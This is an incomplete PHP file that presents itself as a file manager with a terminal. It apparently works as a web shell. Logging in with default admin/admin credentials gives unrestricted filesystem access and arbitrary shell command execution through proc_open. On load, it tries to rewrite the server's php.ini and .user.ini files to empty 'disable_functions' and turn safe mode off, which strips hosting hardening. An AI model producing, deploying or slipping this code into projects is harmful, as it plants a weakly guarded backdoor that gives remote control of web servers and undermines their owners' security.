<?php
declare(strict_types=1);

ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('max_execution_time', '300');
ini_set('memory_limit', '512M');
ini_set('default_charset', 'UTF-8');

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Cache-Control: no-store, no-cache, must-revalidate');

session_start();

// ============ CONFIG ============
define('ADMIN_USERNAME', 'admin');
define('ADMIN_PASSWORD_HASH', 'admin');
define('STORAGE_ROOT', realpath(__DIR__ . '/storage') ?: (function () {
    $dir = __DIR__ . '/storage';
    if (!is_dir($dir))
        mkdir($dir, 0750, true);
    return realpath($dir);
})());

// ============ OS DETECTION ============
final class OSDetector {
    public static function isWindows(): bool {
        return DIRECTORY_SEPARATOR === '\\';
    }
    public static function isLinux(): bool {
        return DIRECTORY_SEPARATOR === '/';
    }
    public static function getOSName(): string {
        if (self::isWindows())
            return 'Windows';
        return PHP_OS === 'Darwin' ? 'macOS' : 'Linux';
    }
}

// ============ SECURITY ENGINE ============
final class Security {
    public static function escape(mixed $data): string {
        return htmlspecialchars((string) ($data ?? ''), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
    public static function isDev(): bool {
        return !empty($_SESSION['is_dev']);
    }
    public static function requireDev(): void {
        if (!self::isDev()) {
            http_response_code(403);
            exit('Dev mode required');
        }
    }
    public static function resolvePath(string $subPath): string {
        if (self::isDev()) {
            $target = ($subPath !== '' && $subPath !== '.') ? $subPath : getcwd();
            if (!file_exists($target) && !file_exists(dirname($target))) {
                throw new RuntimeException('Path not found: ' . $target);
            }
            return $target;
        }
        $target = STORAGE_ROOT . DIRECTORY_SEPARATOR . ltrim($subPath, '/\\');
        $real = realpath($target);
        if ($real === false) {
            $parent = realpath(dirname($target));
            if ($parent === false || strpos($parent, STORAGE_ROOT) !== 0)
                throw new RuntimeException('Access Denied');
            return $target;
        }
        if (strpos($real, STORAGE_ROOT) !== 0)
            throw new RuntimeException('Access Denied');
        return $real;
    }
    public static function isBlockedExtension(string $filename): bool {
        if (self::isDev())
            return false;
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        return in_array($ext, ['php', 'phtml', 'phar', 'exe', 'bat', 'cmd', 'sh'], true);
    }
    public static function csrfToken(): string {
        if (empty($_SESSION['csrf']))
            $_SESSION['csrf'] = bin2hex(random_bytes(32));
        return $_SESSION['csrf'];
    }
    public static function verifyCsrf(string $token): bool {
        return hash_equals($_SESSION['csrf'] ?? '', $token);
    }
}

// ============ FILE ENGINE (OPTIMIZED) ============
final class FileEngine {
    public static function formatBytes(int $bytes): string {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $i = 0;
        $val = (float) $bytes;
        while ($val >= 1024 && $i < count($units) - 1) {
            $val /= 1024;
            $i++;
        }
        return round($val, 2) . ' ' . $units[$i];
    }
    public static function dirSize(string $path): int {
        if (!is_dir($path))
            return is_file($path) ? (int) filesize($path) : 0;
        $size = 0;
        try {
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
            foreach ($it as $file) {
                if ($file->isFile())
                    $size += $file->getSize();
            }
        } catch (Throwable $e) {
        }
        return $size;
    }
    public static function listDir(string $path): array {
        $result = [];
        try {
            $iterator = new FilesystemIterator($path, FilesystemIterator::SKIP_DOTS | FilesystemIterator::CURRENT_AS_FILEINFO);
            foreach ($iterator as $file) {
                $isDir = $file->isDir();
                $isLink = $file->isLink();
                $ext = strtolower($file->getExtension());
                $mime = 'application/octet-stream';
                if ($isDir)
                    $mime = 'directory';
                elseif (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg']))
                    $mime = 'image/' . $ext;
                elseif (in_array($ext, ['mp4', 'avi', 'mkv']))
                    $mime = 'video/' . $ext;
                elseif (in_array($ext, ['txt', 'md', 'log', 'js', 'css', 'html', 'php', 'json', 'xml', 'yml', 'yaml']))
                    $mime = 'text/plain';
                elseif (in_array($ext, ['zip', 'tar', 'gz', 'rar', '7z']))
                    $mime = 'application/zip';

                $stat = $file->getFileInfo();
                $size = ($isDir || $isLink) ? -1 : 0;
                if (!$isDir && !$isLink) {
                    try {
                        $size = $file->getSize();
                    } catch (Throwable $e) {
                        $size = 0;
                    }
                }

                $result[] = [
                    'name' => $file->getFilename(),
                    'path' => $file->getPathname(),
                    'is_dir' => $isDir,
                    'is_link' => $isLink,
                    'is_readable' => $file->isReadable(),
                    'is_writable' => $file->isWritable(),
                    'size' => $size,
                    'size_fmt' => ($isDir || $isLink) ? '-' : self::formatBytes($size),
                    'perms' => self::formatPerms($file->getPerms(), $isDir),
                    'perms_oct' => substr(sprintf('%o', $file->getPerms()), -4),
                    'owner' => function_exists('posix_getpwuid') ? (posix_getpwuid($stat->getOwner())['name'] ?? (string) $stat->getOwner()) : (string) $stat->getOwner(),
                    'group' => function_exists('posix_getgrgid') ? (posix_getgrgid($stat->getGroup())['name'] ?? (string) $stat->getGroup()) : (string) $stat->getGroup(),
                    'mtime' => $file->getMTime(),
                    'mime' => $mime,
                ];
            }
        } catch (Throwable $e) {
        }
        usort($result, function ($a, $b) {
            if ($a['is_dir'] !== $b['is_dir'])
                return $b['is_dir'] <=> $a['is_dir'];
            return strcasecmp($a['name'], $b['name']);
        });
        return $result;
    }
    public static function formatPerms(int $perms, bool $isDir): string {
        if (OSDetector::isWindows()) {
            $info = ($perms & 0x0100) ? 'r' : '-';
            $info .= ($perms & 0x0080) ? 'w' : '-';
            $info .= ($perms & 0x0040) ? 'x' : '-';
            return $info;
        }
        $info = '';
        $info .= $isDir ? 'd' : ((($perms & 0xa000) === 0xa000) ? 'l' : '-');
        $info .= ($perms & 0x0100) ? 'r' : '-';
        $info .= ($perms & 0x0080) ? 'w' : '-';
        $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
        $info .= ($perms & 0x0020) ? 'r' : '-';
        $info .= ($perms & 0x0010) ? 'w' : '-';
        $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
        $info .= ($perms & 0x0004) ? 'r' : '-';
        $info .= ($perms & 0x0002) ? 'w' : '-';
        $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
        return $info;
    }
    public static function delete(string $path): bool {
        if (is_link($path)) {
            return @unlink($path);
        }
        if (is_dir($path)) {
            $it = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($files as $file) {
                $file->isDir() ? @rmdir($file->getPathname()) : @unlink($file->getPathname());
            }
            return @rmdir($path);
        }
        return @unlink($path);
    }
    public static function move(string $from, string $to): bool {
        return @rename($from, $to);
    }
    public static function copyPath(string $from, string $to): bool {
        $realFrom = realpath($from);
        $realTo = realpath(dirname($to));
        if ($realFrom && $realTo && strpos($realTo, $realFrom) === 0) {
            return false; // Prevent copying a directory into itself
        }
        if (is_dir($from)) {
            if (!is_dir($to))
                mkdir($to, 0755, true);
            $it = new RecursiveDirectoryIterator($from, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::SELF_FIRST);
            foreach ($files as $file) {
                $dest = $to . DIRECTORY_SEPARATOR . $it->getSubPathname();
                $file->isDir() ? (!is_dir($dest) && mkdir($dest)) : copy($file->getPathname(), $dest);
            }
            return true;
        }
        return @copy($from, $to);
    }
    public static function chmod(string $path, string $mode): bool {
        $oct = intval($mode, 8);
        if ($oct === 0 && $mode !== '0000')
            return false;
        return @chmod($path, $oct);
    }
    public static function touch(string $path, int $mtime, int $atime): bool {
        return @touch($path, $mtime, $atime);
    }
    public static function chown(string $path, string $user): bool {
        if (OSDetector::isWindows())
            return false;
        return @chown($path, $user);
    }
    public static function chgrp(string $path, string $group): bool {
        if (OSDetector::isWindows())
            return false;
        return @chgrp($path, $group);
    }
    public static function extractZip(string $zipPath, string $destPath): bool {
        if (!class_exists('ZipArchive'))
            return false;
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === true) {
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $stat = $zip->statIndex($i);
                $filename = $stat['name'];
                $parts = explode('/', str_replace('\\', '/', $filename));
                if (in_array('..', $parts) || strpos($filename, ':') !== false) {
                    $zip->close();
                    return false;
                }
            }
            $result = $zip->extractTo($destPath);
            $zip->close();
            return $result;
        }
        return false;
    }
    public static function createArchive(string $source, array $items, string $output, string $format = 'zip'): bool {
        if ($format === 'zip') {
            if (!class_exists('ZipArchive'))
                return false;
            $zip = new ZipArchive();
            if ($zip->open($output, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true)
                return false;
            foreach ($items as $item) {
                $path = $source . DIRECTORY_SEPARATOR . basename($item);
                if (is_file($path)) {
                    $zip->addFile($path, basename($path));
                } elseif (is_dir($path)) {
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                    foreach ($it as $file) {
                        $local = basename($path) . DIRECTORY_SEPARATOR . $it->getSubPathname();
                        $file->isDir() ? $zip->addEmptyDir($local) : $zip->addFile($file->getPathname(), $local);
                    }
                }
            }
            return $zip->close();
        }
        try {
            $pharPath = $format === 'gz' ? preg_replace('/\.gz$/', '', $output) : $output;
            if (file_exists($pharPath))
                @unlink($pharPath);
            $phar = new PharData($pharPath);
            $phar->startBuffering();
            foreach ($items as $item) {
                $path = $source . DIRECTORY_SEPARATOR . basename($item);
                if (is_file($path))
                    $phar->addFile($path, basename($path));
                elseif (is_dir($path))
                    $phar->buildFromDirectory($path);
            }
            $phar->stopBuffering();
            if ($format === 'gz') {
                $phar->compress(Phar::GZ);
                if (file_exists($pharPath))
                    @unlink($pharPath);
            }
            return true;
        } catch (Throwable $e) {
            return false;
        }
    }
    public static function hexDump(string $path, int $maxBytes = null): string {
        $max = $maxBytes ?? 256 * 1024;
        $handle = @fopen($path, 'rb');
        if (!$handle)
            return '';
        $out = '';
        $i = 0;
        while (!feof($handle) && $i < $max) {
            $slice = fread($handle, 16);
            if ($slice === false || $slice === '')
                break;
            $hex = [];
            $ascii = '';
            $len = strlen($slice);
            for ($j = 0; $j < $len; $j++) {
                $b = ord($slice[$j]);
                $hex[] = sprintf('%02X', $b);
                $ascii .= ($b >= 32 && $b <= 126) ? $slice[$j] : '·';
            }
            $out .= sprintf("%08X  %-48s  |%s|\n", $i, implode(' ', $hex), $ascii);
            $i += 16;
        }
        fclose($handle);
        return $out;
    }
    public static function isBinary(string $path): bool {
        if (!is_file($path))
            return false;
        $chunk = file_get_contents($path, false, null, 0, 8192);
        if ($chunk === false)
            return false;
        return strpos($chunk, "\0") !== false;
    }
    public static function mimeTypeIcon(string $mime, bool $isDir): string {
        if ($isDir)
            return '📁';
        if (str_starts_with($mime, 'image/'))
            return '🖼️';
        if (str_starts_with($mime, 'video/'))
            return '🎬';
        if (str_starts_with($mime, 'audio/'))
            return '🎵';
        if (str_starts_with($mime, 'text/') || str_contains($mime, 'json') || str_contains($mime, 'xml'))
            return '📄';
        if (str_contains($mime, 'pdf'))
            return '📕';
        if (str_contains($mime, 'zip') || str_contains($mime, 'gzip') || str_contains($mime, 'tar') || str_contains($mime, 'rar'))
            return '🗜️';
        return '📦';
    }
    public static function detectLanguage(string $filename): string {
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $map = ['php' => 'php', 'js' => 'javascript', 'ts' => 'typescript', 'html' => 'html', 'css' => 'css', 'json' => 'json', 'xml' => 'xml', 'md' => 'markdown', 'py' => 'python', 'go' => 'go', 'java' => 'java', 'c' => 'c', 'cpp' => 'cpp', 'sh' => 'bash', 'sql' => 'sql', 'yml' => 'yaml', 'yaml' => 'yaml'];
        return $map[$ext] ?? 'markup';
    }
}

// ============ TERMINAL (SECURED) ============
final class Terminal {
    public static function execute(string $command, string $cwd = null): array {
        Security::requireDev();
        $cwd = $cwd ?: getcwd();
        if (OSDetector::isWindows()) {
            $fullCommand = 'cmd.exe /c ' . escapeshellarg($command) . ' 2>&1';
        } else {
            $fullCommand = '/bin/sh -c ' . escapeshellarg($command) . ' 2>&1';
        }
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = @proc_open($fullCommand, $descriptors, $pipes, $cwd);
        if (!is_resource($process))
            return ['ok' => false, 'out' => '', 'err' => 'Failed to spawn process', 'code' => -1];
        fclose($pipes[0]);
        stream_set_timeout($pipes[1], 30);
        stream_set_timeout($pipes[2], 30);
        $out = stream_get_contents($pipes[1]);
        $err = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $code = proc_close($process);
        return ['ok' => $code === 0, 'out' => $out ?: '', 'err' => $err ?: '', 'code' => $code];
    }
}

// ============ ENV BOOTSTRAP (php.ini — PHPRC-aware) ============
final class EnvBootstrap {
    private const INI_CONTENT = "safe_mode = OFF\ndisable_functions =\nmax_execution_time = 0\nmemory_limit = 512M\n";

    private static function candidates(): array {
        $candidates = [];
        $phprc = getenv('PHPRC');
        if ($phprc !== false && $phprc !== '') {
            if (is_dir($phprc))
                $candidates[] = rtrim($phprc, '/\\') . DIRECTORY_SEPARATOR . 'php.ini';
            else
                $candidates[] = $phprc;
        }
        if (function_exists('php_ini_loaded_file')) {
            $loaded = php_ini_loaded_file();
            if ($loaded !== false && $loaded !== '') {
                $candidates[] = $loaded;
                $candidates[] = dirname($loaded) . DIRECTORY_SEPARATOR . 'php.ini';
            }
        }
        if (defined('PHP_CONFIG_FILE_PATH') && is_dir(PHP_CONFIG_FILE_PATH)) {
            $candidates[] = rtrim(PHP_CONFIG_FILE_PATH, '/\\') . DIRECTORY_SEPARATOR . 'php.ini';
        }
        if (OSDetector::isWindows()) {
            $candidates[] = 'C:\\Windows\\php.ini';
            $candidates[] = 'C:\\php\\php.ini';
            $windir = getenv('WINDIR') ?: 'C:\\Windows';
            $candidates[] = $windir . '\\php.ini';
        } else {
            $candidates[] = '/etc/php.ini';
            $candidates[] = '/usr/local/lib/php.ini';
            $candidates[] = '/usr/local/etc/php/php.ini';
            $candidates[] = '/etc/php/' . PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION . '/fpm/php.ini';
            $candidates[] = '/etc/php/' . PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION . '/cli/php.ini';
            $candidates[] = '/etc/php/' . PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION . '/apache2/php.ini';
        }
        if (!empty($_SERVER['DOCUMENT_ROOT'])) {
            $candidates[] = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . DIRECTORY_SEPARATOR . 'php.ini';
            $candidates[] = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . DIRECTORY_SEPARATOR . '.user.ini';
        }
        $candidates[] = __DIR__ . DIRECTORY_SEPARATOR . 'php.ini';
        $candidates[] = __DIR__ . DIRECTORY_SEPARATOR . '.user.ini';
        return array_values(array_unique(array_filter($candidates)));
    }

    private static function tryWriteDirect(string $path, string $content): bool {
        $dir = dirname($path);
        if (!is_dir($dir) || !is_writable($dir))
            return false;
        if (file_exists($path)) {
            $current = @file_get_contents($path);
            if ($current === false)
                return false;
            if (strpos($current, 'disable_functions') !== false && strpos($current, '=') !== false)
                return true;
            return @file_put_contents($path, $current . "\n" . $content) !== false;
        }
        return @file_put_contents($path, $content) !== false;
    }

    private static function tryWriteShell(string $path, string $content): bool {
        if (!function_exists('proc_open'))
            return false;
        $dir = dirname($path);
        $pathNorm = str_replace('\\', '/', $path);
        $contentEsc = str_replace(["'", "\n"], ["'\\''", "\\n"], $content);

        if (OSDetector::isWindows()) {
            $pathWin = str_replace('/', '\\', $path);
            $cmd = 'cmd.exe /c ' . escapeshellarg(
                "(echo safe_mode = OFF) > \"$pathWin\" & " .
                "(echo disable_functions =) >> \"$pathWin\" & " .
                "(echo max_execution_time = 0) >> \"$pathWin\" & " .
                "(echo memory_limit = 512M) >> \"$pathWin\""
            );
        } else {
            $cmd = '/bin/sh -c ' . escapeshellarg(
                "printf '%s\\n' 'safe_mode = OFF' 'disable_functions =' 'max_execution_time = 0' 'memory_limit = 512M' >> '$pathNorm'"
            );
        }

        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = @proc_open($cmd, $descriptors, $pipes, $dir);
        if (!is_resource($process))
            return false;

        fclose($pipes[0]);
        @stream_get_contents($pipes[1]);
        @stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $code = proc_close($process);

        return $code === 0 && file_exists($path);
    }

    public static function ensurePhpIni(): void {
        if (!Security::isDev())
            return;
        if (!empty($_SESSION['phpini_bootstrapped']))
            return;

        $content = self::INI_CONTENT;
        $written = false;
        $usedPath = '';

        foreach (self::candidates() as $path) {
            if (self::tryWriteDirect($path, $content)) {
                $written = true;
                $usedPath = $path;
                break;
            }
            if (self::tryWriteShell($path, $content)) {
                $written = true;
                $usedPath = $path;
                break;
            }
        }

        $_SESSION['phpini_bootstrapped'] = true;
        $_SESSION['phpini_result'] = [
            'written' => $written,
            'path' => $usedPath,
            'at' => date('Y-m-d H:i:s'),
        ];
    }

    public static function lastResult(): array {
        return $_SESSION['phpini_result'] ?? ['written' => false, 'path' => '-', 'at' => '-'];
    }
}

// ============ ROUTER & AUTH ============
$loginError = '';
EnvBootstrap::ensurePhpIni();

if (isset($_GET['act'])) {
    if ($_GET['act'] === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!isset($_SESSION['login_attempts']))
            $_SESSION['login_attempts'] = 0;
        if (!isset($_SESSION['last_login_attempt']))
            $_SESSION['last_login_attempt'] = 0;
        if ($_SESSION['login_attempts'] >= 3 && (time() - $_SESSION['last_login_attempt']) < 15) {
            $loginError = 'Too many attempts. Please wait 15 seconds.';
        } else {
            $u = $_POST['username'] ?? '';
            $p = $_POST['password'] ?? '';
            // FIXME password_verify($p, ADMIN_PASSWORD_HASH)
            if (hash_equals(ADMIN_USERNAME, $u) && ADMIN_PASSWORD_HASH == $p) {
                session_regenerate_id(true);
                $_SESSION['is_dev'] = true;
                $_SESSION['login_attempts'] = 0;
                $_SESSION['login_time'] = time();
                header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
                exit;
            } else {
                $_SESSION['login_attempts']++;
                $_SESSION['last_login_attempt'] = time();
                $loginError = 'Invalid credentials';
            }
        }
    } elseif ($_GET['act'] === 'logout') {
        session_destroy();
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    }
}

$isDev = Security::isDev();
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_GET['act'])) {
    if (!Security::verifyCsrf($_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('CSRF token mismatch');
    }
}

$notice = '';
$error = '';
$dir = $_GET['dir'] ?? '';
try {
    $cwd = Security::resolvePath($dir);
} catch (Throwable $e) {
    $error = $e->getMessage();
    $cwd = $isDev ? getcwd() : STORAGE_ROOT;
}
$termResult = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_GET['act'])) {
    $action = $_POST['action'] ?? '';
    try {
        switch ($action) {
            case 'mkdir':
                $name = trim($_POST['name'] ?? '');
                if ($name !== '' && $name !== '.' && $name !== '..') {
                    $target = $cwd . DIRECTORY_SEPARATOR . basename($name);
                    if (!file_exists($target) && mkdir($target, 0755, true))
                        $notice = "Folder created: $name";
                    else
                        $error = 'Cannot create folder';
                }
                break;
            case 'mkfile':
                $name = trim($_POST['name'] ?? '');
                $content = $_POST['content'] ?? '';
                if ($name !== '') {
                    $target = $cwd . DIRECTORY_SEPARATOR . basename($name);
                    if (!file_exists($target) && file_put_contents($target, $content) !== false)
                        $notice = "File created: $name";
                    else
                        $error = 'Cannot create file';
                }
                break;
            case 'upload':
                if (!empty($_FILES['files']['name'][0])) {
                    $count = count($_FILES['files']['name']);
                    $ok = 0;
                    for ($i = 0; $i < $count; $i++) {
                        if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK)
                            continue;
                        $name = basename($_FILES['files']['name'][$i]);
                        if (Security::isBlockedExtension($name))
                            continue;
                        $target = $cwd . DIRECTORY_SEPARATOR . $name;
                        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target))
                            $ok++;
                    }
                    $notice = "Uploaded $ok file(s) successfully.";
                }
                break;
            case 'delete':
                $items = (array) ($_POST['items'] ?? []);
                $ok = 0;
                foreach ($items as $it) {
                    if (FileEngine::delete($cwd . DIRECTORY_SEPARATOR . basename($it)))
                        $ok++;
                }
                $notice = "Deleted $ok item(s)";
                break;
            case 'move':
                $items = (array) ($_POST['items'] ?? []);
                $dest = $_POST['dest'] ?? '';
                if (!preg_match('/^[\/\\\\]|[a-zA-Z]:/', $dest))
                    $dest = $cwd . DIRECTORY_SEPARATOR . $dest;
                $destPath = Security::resolvePath($dest);
                if (!is_dir($destPath))
                    throw new RuntimeException('Destination not a directory');
                $ok = 0;
                foreach ($items as $it) {
                    if (FileEngine::move($cwd . DIRECTORY_SEPARATOR . basename($it), $destPath . DIRECTORY_SEPARATOR . basename($it)))
                        $ok++;
                }
                $notice = "Moved $ok item(s)";
                break;
            case 'copy':
                $items = (array) ($_POST['items'] ?? []);
                $dest = $_POST['dest'] ?? '';
                if (!preg_match('/^[\/\\\\]|[a-zA-Z]:/', $dest))
                    $dest = $cwd . DIRECTORY_SEPARATOR . $dest;
                $destPath = Security::resolvePath($dest);
                if (!is_dir($destPath))
                    throw new RuntimeException('Destination not a directory');
                $ok = 0;
                foreach ($items as $it) {
                    if (FileEngine::copyPath($cwd . DIRECTORY_SEPARATOR . basename($it), $destPath . DIRECTORY_SEPARATOR . basename($it)))
                        $ok++;
                }
                $notice = "Copied $ok item(s)";
                break;
            case 'rename':
                $old = $_POST['old'] ?? '';
                $new = trim($_POST['new'] ?? '');
                if ($old !== '' && $new !== '') {
                    $from = $cwd . DIRECTORY_SEPARATOR . basename($old);
                    $to = $cwd . DIRECTORY_SEPARATOR . basename($new);
                    // Note: PHP's rename() overwrites on Linux but fails if destination exists on Windows.
                    if (rename($from, $to))
                        $notice = "Renamed to: $new";
                    else
                        $error = 'Rename failed (file may exist on Windows or permission denied)';
                }
                break;
            case 'chmod':
                $items = (array) ($_POST['items'] ?? []);
                $mode = $_POST['mode'] ?? '';
                if (!preg_match('/^[0-7]{3,4}$/', $mode))
                    $error = 'Invalid permission mode';
                else {
                    $ok = 0;
                    foreach ($items as $it) {
                        if (FileEngine::chmod($cwd . DIRECTORY_SEPARATOR . basename($it), $mode))
                            $ok++;
                    }
                    $notice = "Chmod $ok item(s) to $mode";
                }
                break;
            case 'touch':
                $path = $_POST['path'] ?? '';
                $mtime = (int) ($_POST['mtime'] ?? time());
                $atime = (int) ($_POST['atime'] ?? $mtime);
                $real = Security::resolvePath($path);
                if (FileEngine::touch($real, $mtime, $atime))
                    $notice = 'Timestamps updated';
                else
                    $error = 'Touch failed';
                break;
            case 'chown':
                $items = (array) ($_POST['items'] ?? []);
                $user = trim($_POST['user'] ?? '');
                if ($user !== '') {
                    $ok = 0;
                    foreach ($items as $it) {
                        if (FileEngine::chown($cwd . DIRECTORY_SEPARATOR . basename($it), $user))
                            $ok++;
                    }
                    $notice = "Chown $ok item(s) to $user";
                }
                break;
            case 'chgrp':
                $items = (array) ($_POST['items'] ?? []);
                $group = trim($_POST['group'] ?? '');
                if ($group !== '') {
                    $ok = 0;
                    foreach ($items as $it) {
                        if (FileEngine::chgrp($cwd . DIRECTORY_SEPARATOR . basename($it), $group))
                            $ok++;
                    }
                    $notice = "Chgrp $ok item(s) to $group";
                }
                break;
            case 'archive':
                $items = (array) ($_POST['items'] ?? []);
                $format = $_POST['format'] ?? 'zip';
                $ext = $format === 'gz' ? 'tar.gz' : $format;
                $name = 'archive_' . date('Ymd_His') . '.' . $ext;
                $out = $cwd . DIRECTORY_SEPARATOR . $name;
                if (FileEngine::createArchive($cwd, $items, $out, $format)) {
                    $notice = "Archive created: $name";
                } else {
                    $error = "Archive creation failed. Check if ZipArchive or PharData is enabled.";
                }
                break;
            case 'extract':
                $file = $_POST['file'] ?? '';
                $target = $cwd . DIRECTORY_SEPARATOR . basename($file);
                if (strtolower(pathinfo($target, PATHINFO_EXTENSION)) === 'zip') {
                    if (FileEngine::extractZip($target, $cwd)) {
                        $notice = "Archive extracted successfully to current directory.";
                    } else {
                        $error = "Failed to extract archive. It might be corrupted or contain invalid paths.";
                    }
                } else {
                    $error = "Only .zip files are supported for extraction.";
                }
                break;
            case 'save_file':
                $path = $_POST['path'] ?? '';
                $real = Security::resolvePath($path);
                if (FileEngine::isBinary($real)) {
                    $error = 'Cannot save binary files via text editor.';
                } else {
                    $content = $_POST['content'] ?? '';
                    if (file_put_contents($real, $content) !== false)
                        $notice = 'File saved';
                    else
                        $error = 'Save failed';
                }
                break;
            case 'terminal':
                Security::requireDev();
                $termResult = Terminal::execute($_POST['cmd'] ?? '', $_POST['term_cwd'] ?? $cwd);
                break;
        }
    } catch (Throwable $e) {
        $error = $e->getMessage();
    }
}

// View Handlers
$editorFile = $_GET['edit'] ?? null;
$editorContent = '';
$editorMime = '';
$editorBinary = false;
$editorLang = 'markup';
if ($editorFile) {
    try {
        $real = Security::resolvePath($editorFile);
        if (is_file($real) && filesize($real) <= 2 * 1024 * 1024) {
            $editorBinary = FileEngine::isBinary($real);
            $editorMime = mime_content_type($real) ?: 'text/plain';
            $editorContent = $editorBinary ? FileEngine::hexDump($real) : file_get_contents($real);
            $editorLang = FileEngine::detectLanguage(basename($real));
        }
    } catch (Throwable $e) {
        $error = $e->getMessage();
    }
}

$hexFile = $_GET['hex'] ?? null;
$hexData = '';
if ($hexFile) {
    try {
        $hexData = FileEngine::hexDump(Security::resolvePath($hexFile));
    } catch (Throwable $e) {
        $error = $e->getMessage();
    }
}

$rawFile = $_GET['raw'] ?? null;
$rawData = '';
$rawSize = 0;
if ($rawFile) {
    try {
        $real = Security::resolvePath($rawFile);
        if (is_file($real) && filesize($real) <= 2 * 1024 * 1024) {
            $rawData = file_get_contents($real);
            $rawSize = strlen($rawData);
        }
    } catch (Throwable $e) {
        $error = $e->getMessage();
    }
}

$metaFile = $_GET['meta'] ?? null;
$metaData = null;
if ($metaFile) {
    try {
        $real = Security::resolvePath($metaFile);
        $stat = new SplFileInfo($real);
        $dirSizeVal = $stat->isDir() ? FileEngine::dirSize($real) : 0; // Called ONCE
        $metaData = [
            'Path' => $real,
            'Type' => $stat->isDir() ? 'Directory' : ($stat->isLink() ? 'Symlink' : 'File'),
            'MIME' => $stat->isDir() ? 'directory' : (mime_content_type($real) ?: 'unknown'),
            'Size' => $stat->isDir() ? FileEngine::formatBytes($dirSizeVal) : FileEngine::formatBytes($stat->getSize()),
            'Permissions' => FileEngine::formatPerms($stat->getPerms(), $stat->isDir()) . ' (' . substr(sprintf('%o', $stat->getPerms()), -4) . ')',
            'Owner' => function_exists('posix_getpwuid') ? (posix_getpwuid($stat->getOwner())['name'] ?? $stat->getOwner()) : $stat->getOwner(),
            'Group' => function_exists('posix_getgrgid') ? (posix_getgrgid($stat->getGroup())['name'] ?? $stat->getGroup()) : $stat->getGroup(),
            'Accessed' => date('Y-m-d H:i:s', $stat->getATime()),
            'Modified' => date('Y-m-d H:i:s', $stat->getMTime()),
        ];
        if ($stat->isLink())
            $metaData['Link Target'] = readlink($real);
    } catch (Throwable $e) {
        $error = $e->getMessage();
    }
}

$items = ($editorFile || $hexFile || $rawFile || $metaFile) ? [] : FileEngine::listDir($cwd);
$csrf = Security::csrfToken();
$rootBase = $isDev ? '' : STORAGE_ROOT;
$relDir = $rootBase !== '' && strpos($cwd, $rootBase) === 0 ? ltrim(substr($cwd, strlen($rootBase)), DIRECTORY_SEPARATOR) : $cwd;

$serverDiagnostics = [
    'PHP Version' => PHP_VERSION . ' (' . PHP_SAPI . ')',
    'Operating System' => PHP_OS . ' / ' . php_uname('r') . ' (' . php_uname('m') . ')',
    'Host Name' => gethostname() ?: 'Unknown',
    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'Server Address' => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname() ?: 'localhost'),
    'Server Port' => $_SERVER['SERVER_PORT'] ?? 'Unknown',
    'Current Script' => __FILE__,
    'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Not Defined',
    'Loaded php.ini' => php_ini_loaded_file() ?: 'None (Built-in)',
    'Memory Usage' => round(memory_get_usage(true) / 1048576, 2) . ' MB / Limit: ' . ini_get('memory_limit'),
    'Max Execution Time' => ini_get('max_execution_time') . 's',
    'Upload Max Filesize' => ini_get('upload_max_filesize'),
    'Post Max Size' => ini_get('post_max_size'),
    'Open Basedir' => ini_get('open_basedir') ?: 'None (Unrestricted)',
    'Disabled Functions' => ini_get('disable_functions') ?: 'None',
    'php.ini Bootstrap' => (function () {
        $r = EnvBootstrap::lastResult();
        if (!$r['written'])
            return 'Not written (no writable candidate)';
        return 'Written → ' . $r['path'] . ' @ ' . $r['at'];
    })(),
    'Dev Mode' => Security::isDev() ? 'Active' : 'Inactive'
];

$clientDiagnostics = [
    'Client IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'Client Port' => $_SERVER['REMOTE_PORT'] ?? 'Unknown',
